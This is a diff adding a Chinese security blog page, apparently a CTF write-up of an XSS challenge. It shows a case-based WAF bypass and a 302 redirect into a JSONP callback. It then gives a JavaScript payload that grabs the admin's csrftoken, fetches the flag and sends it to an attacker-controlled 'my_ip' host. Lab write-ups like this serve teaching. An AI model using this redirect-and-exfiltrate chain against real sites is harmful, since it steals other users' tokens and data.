@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>一次有趣的XSS弹弹乐 | Cryscat&#39;s Blog | 一只安全狗</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#000000">
+    
+    
+    <meta name="keywords" content="XSS,技巧,Note,CTF">
+    <meta name="description" content="主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf  \alert(1)&amp;lt;\SCRIPT&amp;gt;   但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf 访问接口需要进">
+<meta name="keywords" content="XSS,技巧,Note,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次有趣的XSS弹弹乐">
+<meta property="og:url" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/index.html">
+<meta property="og:site_name" content="Cryscat&#39;s Blog">
+<meta property="og:description" content="主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf  \alert(1)&amp;lt;\SCRIPT&amp;gt;   但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf 访问接口需要进">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/1.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/2.jpg">
+<meta property="og:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/3.jpg">
+<meta property="og:updated_time" content="2019-04-08T16:04:02.346Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一次有趣的XSS弹弹乐">
+<meta name="twitter:description" content="主页： 对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了登进去是这样的： site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf  \alert(1)&amp;lt;\SCRIPT&amp;gt;   但输入的内容不符合网站格式，admin不会访问 这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf 访问接口需要进">
+<meta name="twitter:image" content="http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/1.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Cryscat&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/bg.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Cryscat</h5>
+          <a href="mailto:cry3c4t@gmail.com" title="cry3c4t@gmail.com" class="mail">cry3c4t@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Cryscat" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.zhihu.com/people/kaka-64-40/activities" target="_blank">
+                <i class="icon icon-lg icon-book"></i>
+                Zhihu
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/kaka27258546" target="_blank">
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/aboutme">
+                <i class="icon icon-lg icon-black-tie"></i>
+                About&amp;Friendlink
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">一次有趣的XSS弹弹乐</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">一次有趣的XSS弹弹乐</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-08T13:20:32.000Z" itemprop="datePublished" class="page-time">
+  2019-04-08
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+
+<article id="post-一次有趣的XSS弹弹乐" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">一次有趣的XSS弹弹乐</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-08 21:20:32" datetime="2019-04-08T13:20:32.000Z" itemprop="datePublished">2019-04-08</time>
+
+            
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <img src="/2019/04/08/一次有趣的XSS弹弹乐/1.jpg">
+<p>主页：<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/2.jpg"></p>
+<p>对着输入框一顿乱锤没反应，还是老老实实注册了个账号登进去了<br>登进去是这样的：<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/3.jpg"></p>
+<p>site填入自己的服务器地址发现他会访问。经过简单测试发现这里存在反射型XSS，通过大写可以绕过waf</p>
+<blockquote>
+<p>\<script>alert(1)&lt;\SCRIPT&gt;</p>
+</blockquote>
+<img src="/2019/04/08/一次有趣的XSS弹弹乐/4.jpg">
+<p>但输入的内容不符合网站格式，admin不会访问</p>
+<p>这里发现一个getInfo接口，返回 jsonp 数据，也存在反射型xss,而且没上waf<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/5.jpg"><br><img src="/2019/04/08/一次有趣的XSS弹弹乐/6.jpg"></p>
+<p>访问接口需要进行referer验证<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/7.jpg"></p>
+<p>flag是通过getflag接口获取的，需要参数是csrftoken<br><img src="/2019/04/08/一次有趣的XSS弹弹乐/8.jpg"><br>获取ﬂag的权限是通过 jsonp 中的 username验证的 ，这个 username 是后端解密 cookie 中的username 得到的明文。cookie 中的 username 受 http-only 保护不可读取，也没有能显示出 cookie 中加密的 username 的页面，于是只能控制admin去访问ﬂag页面然后返回给我们了</p>
+<p>这时候的攻击思路就比较明确了：site填入<code>http://xxxx/action.php?callback=\&lt;js代码&gt;</code>让admin访问这个url触发XSS获取自己的csrftoken值，然后带着这个值访问getflag接口，最后再将flag内容发送到我们的服务器。<br>但是又遇到一个问题：site可填入的url长度太短了，根本不可能填入这样一个附带JS脚本的url，那只能另辟蹊径了</p>
+<p>另一条攻击链：</p>
+<blockquote>
+<p>链接 –&gt; 302跳转到 jsonp xss –&gt; 提取 jsonp 中 csrftoken  –&gt; xhr 控制读取 flag –&gt; 返回flag到服务器</p>
+</blockquote>
+<p>site:<code>http://my_ip/xss.php</code><br>xss.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Location: http://target_ip/action.php?callback=&lt;script+src="http://my_ip/xss.js"&gt;&lt;/script&gt;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>HTTP_REFERER 是由 html 文档对象 document 提供的,Location 是 http 协议的头部内容,浏览器一旦收到，就执行了,此时 document 尚未创建,所以此时的referer还是<code>http://target_ip/loged.php</code></p>
+<p>xss.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> <span class="title">cryscat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> obj = <span class="built_in">eval</span>(<span class="string">'('</span>+<span class="built_in">document</span>.body.innerText+<span class="string">')'</span>);</span><br><span class="line">	<span class="keyword">var</span> ct = obj.csrftoken;</span><br><span class="line">	<span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xml.open(<span class="string">'Get'</span>,<span class="string">'http://target_ip/getflag.php?csrftoken='</span>+ct,<span class="literal">false</span>);</span><br><span class="line">	xml.send();</span><br><span class="line">	<span class="keyword">var</span> res = xml.responseText;</span><br><span class="line">	<span class="built_in">window</span>.open(<span class="string">'http://my_ip/?msg='</span>+res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后返回的data:</p>
+<blockquote>
+<p>{‘flag’:’flag{j50nP_1s_VulN3r4bLe}’,’csrftoken’:’058807fed91d1b8807688bd258710cbe’} IP: 111.198.29.45  Referer: <a href="http://111.198.29.45:30987/action.php">http://111.198.29.45:30987/action.php</a>? callback=%3Cscript+src=%22<a href="http://my_ip/xss.js%22%3E%3C%2Fscript%3E">http://my_ip/xss.js%22%3E%3C%2Fscript%3E</a></p>
+</blockquote>
+<p>目前就找到这一个可行思路，有想法的小伙伴可以+QQ call me哟(・ω&lt;)<br>Thank you for reading.</p>
+</script></p></blockquote>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.cryscat.com">
+            <img src="/img/avatar.jpg" alt="Cryscat">
+            Cryscat
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Note/">Note</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技巧/">技巧</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&title=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&title=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/04/01/嘉韦斯杯Writeup/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">嘉韦斯杯Writeup</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="bottom">
+        <p><span>Cryscat &copy; 2018 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&title=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&pic=http://www.cryscat.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&title=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&source=在信安界苟延残喘" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《一次有趣的XSS弹弹乐》 — Cryscat's Blog&url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/&via=http://www.cryscat.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.cryscat.com/2019/04/08/一次有趣的XSS弹弹乐/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLklEQVR42u3aS27DMAxF0ex/0wrQUQexeh8ZFzB1NSoSN/bxgODv9cJn/Rzy7fp1rq68un7/v184MmTIeCxjbU/KIA93df3+pfxBlSFDxgEMEkb5jXmoTe97+bkMGTJkbB9iH3BreZ0MGTJkdAIuT9f2D0ceXYYMGTLSIpa00r6bXN5Si8uQIeOBjHQw8J9/3zjfkCFDxkMYq3RIsZoOG3iQ/fBrMmTIGM2otcb6CRyHBYFYhgwZxzD2pSZfFOuPAch6x2XAlSFDxjgGadaTlhlftqgFXPQSZciQMZqRhjaSupHXsR9C8E9kyJBxGoOvTXQqSh5S06UxGTJkzGPwdDAtO3nrn6eGaDAgQ4aMQYzO0tUd5W7KkyFDxjmMWuuNlJedBJHfUYYMGScwas2sNI0jyWJx/ClDhowDGOm4kQTZ/nggoMqQIWM0o9+r66xE8LCOwrEMGTKGMvhCQ7+tXyuJg30QGTJkjGakaVl/9MhfLip9ZciQMZqRlrL90jQticmwU4YMGecwOqPKzjAgHUIUE0QZMmSMYKTrWf3XwQMrSjFlyJAxmlHra9WCeC3gklcgQ4aMqYwVnjRd47/TGjzIkCFjNKM27EzDa2dFI00cZciQMZXBm/V8XYMXxvx3ZMiQIeO++J2OJ3kJLUOGDBlpwO08RK2URY8iQ4aMwxgk4as1wm5spcmQIWMQgy+VpuVlujBRHAbIkCFjNKMWlHnLrL8Dko4WZMiQMYjxBnQ32xleuRkbAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '你去哪啦！(｡•ˇ‸ˇ•｡)';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来！( • ̀ω•́ )✧';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":90,"height":180},"mobile":{"show":true,"scale":0.5},"log":false});</script></body>
+</html>
